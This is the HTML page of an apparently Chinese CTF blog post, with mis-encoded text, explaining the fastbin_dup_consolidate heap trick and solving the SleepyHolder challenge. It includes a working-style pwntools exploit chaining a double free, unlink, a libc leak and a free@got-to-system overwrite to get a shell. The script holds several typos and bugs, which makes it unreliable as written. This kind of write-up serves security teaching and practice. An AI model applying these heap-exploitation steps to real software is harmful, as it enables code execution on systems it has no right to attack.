<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SleepHolder | Bin FantasyğŸ¤¯</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="â€‹                å…³äºfastbin_dup_consolidateï¼Œä»¥åŠunlinkçš„å¦ä¸€é¢˜ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="SleepHolder">
<meta property="og:url" content="http://example.com/2020/03/03/SleepHolder/index.html">
<meta property="og:site_name" content="Bin FantasyğŸ¤¯">
<meta property="og:description" content="â€‹                å…³äºfastbin_dup_consolidateï¼Œä»¥åŠunlinkçš„å¦ä¸€é¢˜ã€‚">
<meta property="og:locale">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/2.png">
<meta property="article:published_time" content="2020-03-03T05:43:46.000Z">
<meta property="article:modified_time" content="2020-07-13T12:55:05.362Z">
<meta property="article:author" content="Ash3n On3">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/1.png">
  
    <link rel="alternate" href="/atom.xml" title="Bin FantasyğŸ¤¯" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/plugin/bganimation/bg.css">

  

  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
    <h2 class="author">Ash3n On3</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>14</strong><br>æ–‡ç« </div></a>
      <a href="/categories"><div><strong>0</strong><br>åˆ†ç±»</div></a>
      <a href="/tags"><div><strong>0</strong><br>æ ‡ç­¾</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>ä¸»é¡µ</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>å½’æ¡£</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>åˆ†ç±»</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>æ ‡ç­¾</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main"><article id="post-SleepHolder" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/03/SleepHolder/" class="article-date">
  <time class="post-time" datetime="2020-03-03T05:43:46.000Z" itemprop="datePublished">
    <span class="post-month">3æœˆ</span><br/>
    <span class="post-day">03</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      SleepHolder
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>â€‹                å…³äºfastbin_dup_consolidateï¼Œä»¥åŠunlinkçš„å¦ä¸€é¢˜ã€‚<span id="more"></span></p>
<p>â€‹                ä»Šå¤©åšé¢˜è¿˜æŒºå¿«ï¼Œæ¯•ç«Ÿæ˜¯ä¹‹å‰å·²ç»ç ”ç©¶è¿‡ä¸€ç‚¹çš„é¢˜ç›®ã€‚</p>
<h2 id="0x00-fastbin-dup-consolidate"><a href="#0x00-fastbin-dup-consolidate" class="headerlink" title="0x00 . fastbin_dup_consolidate"></a>0x00 . fastbin_dup_consolidate</h2><p>â€‹                è´´ä¸€ä¸‹ä»£ç ä½œä¸ºä¾‹å­ã€‚ã€‚(code from how2heap)</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span> p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Allocated two fastbins p1=%p p2=%pn, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Now free p1!n);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Allocated large bin to trigger <span class="built_in">malloc_consolidate</span>() p3=%pn, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, In <span class="built_in">malloc_consolidate</span>(), p1 is moved to the unsorted bin.n);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Trigger the <span class="keyword">double</span> free vulnerability!n);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, We can pass the check in <span class="built_in">malloc</span>() since p1 is <span class="keyword">not</span> fast top.n);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Now p1 is in unsorted bin <span class="keyword">and</span> fast bin. So we<span class="number">&#x27;</span>will get it twice %p %pn, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹                ä»£ç è¯´æ˜äº†ä¸¤ä»¶äº‹ï¼š</p>
<p>â€‹                1ã€è¦å®ç°doubleå¹¶éåªèƒ½ç”¨é‡Šæ”¾å †å—æ¥æ©æŠ¤ï¼šfree(1);free(2);free(1);è¿˜å¯ä»¥ç”³è¯·å †å—æ¥æ©æŠ¤ï¼šfree(1);malloc(2);free(1);</p>
<p>â€‹                2ã€ç³»ç»Ÿåœ¨åˆ†é…large chunkçš„æ—¶å€™ä¼šè°ƒç”¨malloc_consolidate()ï¼Œè¿™ä¸ªå‡½æ•°ç›¸å½“äºfree()ï¼Œå°±æ˜¯ä¸€ä¸ªå›æ”¶å‡½æ•°ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å°†fastbinä¸­çš„chunkæ•´ç†ä¸€ä¸‹ï¼Œèƒ½åˆå¹¶å°±åˆå¹¶ï¼Œä¸èƒ½åˆå¹¶ä¹Ÿæ¸…é™¤ä¸€ä¸‹ä½¿ç”¨æ ‡å¿—ä½(inuse = 0)ï¼Œç„¶åå…¨éƒ¨ä¸¢åˆ°unsort biné‡Œé¢ã€‚</p>
<p>â€‹                3ã€æ‰€ä»¥å¦‚æœå†malloc()ä¸€æ¬¡ï¼Œå°±å¯ä»¥å¤šfree(1)ä¸€æ¬¡ï¼Œå› ä¸ºäººå®¶æœ¬æ¥ä¹Ÿä¸åœ¨fast binï¼Œè€Œä¸”ä¹Ÿä¸è¢«top chunkæ‰€æŒ‡ã€‚</p>
<h2 id="0x01-SleepyHolder-Write-Up"><a href="#0x01-SleepyHolder-Write-Up" class="headerlink" title="0x01 . SleepyHolder Write Up"></a>0x01 . SleepyHolder Write Up</h2><h3 id="A-åˆ†æç¨‹åº"><a href="#A-åˆ†æç¨‹åº" class="headerlink" title="A . åˆ†æç¨‹åº"></a>A . åˆ†æç¨‹åº</h3><p>â€‹                è¿è¡Œçœ‹çœ‹æ•ˆæœï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Waking Sleepy Holder up ...</span><br><span class="line">Hey! Do you have any secret?</span><br><span class="line">I can help you to hold your secrets, and no one will be able to see it :)</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">1</span><br><span class="line">What secret do you want to keep?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">3. Keep a huge secret and lock it forever</span><br><span class="line">1</span><br><span class="line">Tell me your secret: </span><br><span class="line">AAAAAA</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">3</span><br><span class="line">Which Secret do you want to renew?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">1</span><br><span class="line">Tell me your secret: </span><br><span class="line">Small</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">2</span><br><span class="line">Which Secret do you want to wipe?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>â€‹                çœ‹çœ‹ä¿æŠ¤å’Œæ–‡ä»¶æ ¼å¼ï¼š</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/1.png" style="zoom:67%;" />

<p>â€‹                ä¸»è¦å‡½æ•°å¦‚ä¸‹ï¼Œé™¤æ­¤ä¹‹å¤–æœ¬ç¨‹åºä¸­çš„alarm()ä¹Ÿéœ€è¦keypatchæ‰ã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/3.png"  />

<p>â€‹                åˆ†æä¸»è¦å‡½æ•°ï¼š</p>
<p>â€‹                Add():åªå…è®¸åˆ†é…small,big,hugeä¸‰ç§secretï¼Œæ¯ç§åªèƒ½åˆ†é…ä¸€æ¬¡ï¼Œè€Œä¸”hugeåªè¦åˆ†é…è¿‡åï¼Œå°±ä¸å†å…è®¸ä½¿ç”¨huge secretäº†ã€‚å¦å¤–ï¼Œè¿™ä¸‰ç§secretçš„æŒ‡é’ˆéƒ½ä½äºbssæ®µï¼Œæ˜¯å…¨å±€å˜é‡ã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/2.png" style="zoom:87%;" />

<p>â€‹                Wipe():free()æ—¶æœªæ£€æŸ¥æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºï¼Œå­˜åœ¨Double freeæ¼æ´ã€‚</p>
<p>â€‹                Renew():è¾“å…¥é™åˆ¶å¤§å°ï¼Œä¸å¯å †æº¢å‡ºã€‚å› æ­¤æ„é€ å’Œè¾“å…¥payloadæ—¶éƒ½è¦æ ¹æ®secretå¤§å°æ¥é€‰æ‹©ã€‚</p>
<p>â€‹                å¦å¤–ç¨‹åºä¸­æ²¡æœ‰æ‰¾åˆ°è¾“å‡ºå‡½æ•°ï¼Œå¤§è‡´æ–¹å‘è¿˜æ˜¯ä¿®æ”¹gotè¡¨ï¼Œputs(func@plt)ï¼Œè®¡ç®—åç§»å¾—åˆ°libcï¼Œå†getshellã€‚</p>
<h3 id="B-å†…å­˜å¸ƒå±€"><a href="#B-å†…å­˜å¸ƒå±€" class="headerlink" title="B . å†…å­˜å¸ƒå±€"></a>B . å†…å­˜å¸ƒå±€</h3><ul>
<li><p>ç”³è¯·small chunkå’Œbig chunkï¼Œç„¶åé‡Šæ”¾small chunkã€‚</p>
</li>
<li><p>ç”³è¯·huge chunkï¼Œæ­¤æ—¶ç”±äºmalloc_consolidate()ï¼Œsmall chunkè¢«ä¸¢è¿›unsort binã€‚</p>
</li>
<li><p>å†é‡Šæ”¾small chunkï¼ŒåˆæŠŠsmall chunkä¸¢è¿›fast binã€‚double freeã€‚</p>
</li>
<li><p>small chunkæ„é€ fake_chunkï¼Œå¹¶ä¿®æ”¹big chunkçš„æ ‡å¿—ä½ï¼Œæ¬ºéª—ç³»ç»Ÿç›¸ä¿¡fake chunkå·²ç»freeï¼Œéœ€è¦åˆå¹¶ã€‚</p>
</li>
<li><p>æ­¤æ—¶é‡Šæ”¾big chunkï¼Œç³»ç»Ÿä¼šä½¿å…¶ä¸small_chunké‡Œé¢çš„fake_chunkåˆå¹¶ï¼Œå¯¼è‡´unlinkã€‚</p>
</li>
<li><p>æ­¤æ—¶å†™å…¥fake chunkä¸­çš„æŒ‡é’ˆæˆåŠŸåç§»ã€‚</p>
<h3 id="C-Leak-amp-Getshell"><a href="#C-Leak-amp-Getshell" class="headerlink" title="C  . Leak &amp; Getshell"></a>C  . Leak &amp; Getshell</h3></li>
<li><p>é€šè¿‡small_ptræŠŠbig_ptrã€small_ptrå’Œ3ä¸ªæ ‡å¿—ä½åˆ†åˆ«æ”¹æˆatoi@pltï¼Œfree@gotï¼Œå’Œ1ã€‚</p>
</li>
<li><p>renew(1)å°†puts@gotå†™å…¥small_ptrï¼Œå…¶å®æ˜¯è¦†å†™äº†free@gotã€‚</p>
</li>
<li><p>free(2)ç›¸å½“äºputs(atoi@plt)ï¼Œé€šè¿‡è®¡ç®—å¯ä»¥é€å‡ºlibcåœ°å€å•¦ã€‚</p>
</li>
<li><p>ç°åœ¨æˆ‘ä»¬å·²ç»æˆåŠŸé€åˆ°äº†libcçš„åœ°å€ï¼Œé€šè¿‡è®¡ç®—å¯ä»¥å¾—åˆ°systemåœ°å€äº†ã€‚</p>
</li>
<li><p>renew(1)å°†system_addrå†™å…¥åˆ°small_ptrï¼Œå…¶å®ä¹Ÿæ˜¯è¦†å†™äº†free@gotã€‚</p>
</li>
<li><p>renew(2)å°†â€/bin/sh\x00â€å†™å…¥åˆ°big_ptrå¾…ç”¨ã€‚</p>
</li>
<li><p>ç°åœ¨åªè¦wipe(2)ï¼Œå®é™…ä¸Šå°±æ˜¯getshellå’¯(ã€‚ãƒ»âˆ€ãƒ»)ãƒã€‚</p>
<h4 id="D-Exp"><a href="#D-Exp" class="headerlink" title="D . Exp"></a>D . Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./SleepyHolder&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./SleepyHolder&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">small_ptr = <span class="number">0x06020D0</span></span><br><span class="line">free_addr = elf.got[free]</span><br><span class="line">puts_addr = elf.got[puts]</span><br><span class="line">puts_plt = elf.plt[puts]</span><br><span class="line">atoi_addr = elf.got[atoi]</span><br><span class="line">atoi_offset = libc.symbols[atoi]</span><br><span class="line">system_offset = libc.symbols[system]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.recvuntill(<span class="string">&quot;3. Renew secret\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(index))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;Tell me your secret:\n&quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wipe</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntill(<span class="string">&quot;3. Renew secret\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;2. Big secret\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renew</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.recvuntill(<span class="string">&quot;3. Renew secret&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;2. Big secret&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(index))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;Tell me your secret:&quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#=======================Memory Arrange=======================</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&quot;BBBBBBBB&quot;</span>)</span><br><span class="line">wipe(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&quot;CCCCCCCCC&quot;</span>)			<span class="comment">#triger malloc_consolidate()</span></span><br><span class="line">wipe(<span class="number">1</span>)				<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">fake_chunk =p64(<span class="number">0</span>)*<span class="number">2</span>		<span class="comment">#chunk header is useless</span></span><br><span class="line">fake_chunk+=p64(small_ptr-<span class="number">0x18</span>)	<span class="comment">#unlink ptr</span></span><br><span class="line">fake_chunk+=p64(small_ptr-<span class="number">0x10</span>)	<span class="comment">#unlink ptr too</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0x20</span>)		<span class="comment">#made chunk2 believe that chunk1is free to triger unlink</span></span><br><span class="line">add(<span class="number">1</span>,fake_chunk)			<span class="comment">#now we can move the small_ptr later</span></span><br><span class="line">wipe(<span class="number">2</span>)				<span class="comment">#triger the unlink</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#============================ Leak ===========================</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=atoi_addr	<span class="comment">#big_chunk = atoi@got</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">8</span>	<span class="comment">#the huge_ptr is useless anyway</span></span><br><span class="line">payload+=free_addr	<span class="comment">#small_chunk = free@got</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)*<span class="number">3</span>	<span class="comment">#insure 3 flags == 1</span></span><br><span class="line">renew(<span class="number">1</span>,payload)	<span class="comment">#change the chunk_ptr to got</span></span><br><span class="line">renew(<span class="number">1</span>,puts_plt)	<span class="comment">#change free_addr to puts_plt</span></span><br><span class="line">wipe(<span class="number">2</span>)		<span class="comment">#free(big_ptr) &lt;----&gt; puts(puts_plt)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=========================== GetShell ========================</span></span><br><span class="line">libc_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;/x00&#x27;</span>)) - atoi_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">renew(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">renew(<span class="number">2</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/03/03/SleepHolder/" data-id="ckmlis0z40008s0ljamo0h76v" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/03/06/house-of-spirit/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          House_of_spirit
        
      </div>
    </a>
  
  
    <a href="/2020/03/02/Unlink-stkof/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Unlink(stkof)</div>
    </a>
  
</nav>

  
</article>



</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Bin FantasyğŸ¤¯</h1>
    <h2 class="blog-subtitle">You may found nothing here.</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>ä¸»é¡µ</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>å½’æ¡£</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>åˆ†ç±»</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>æ ‡ç­¾</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
    <h2 class="author">Ash3n On3</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>14</strong><br>æ–‡ç« </div></a>
      <a href="/categories"><div><strong>0</strong><br>åˆ†ç±»</div></a>
      <a href="/tags"><div><strong>0</strong><br>æ ‡ç­¾</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>å‹é“¾</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
    </div>
  </div>
</div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2020 - 2021 Ash3n On3<br>
      ç”±<a href="http://hexo.io/" target="_blank">Hexo</a>å¼ºåŠ›é©±åŠ¨ | 
      ä¸»é¢˜-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
    </div>
    
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  
<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">

  
<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>




  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>è‹Ÿåˆ©</span></li> 
    <li><span>å›½å®¶</span></li> 
    <li><span>ç”Ÿæ­»ä»¥</span></li> 
    <li><span>å²‚èƒ½</span></li> 
    <li><span>ç¥¸ç¦</span></li> 
    <li><span>è¶‹é¿ä¹‹</span></li> 
  </ul>
</section>

<script src="/js/script.js"></script>




  </div>
</body>
</html>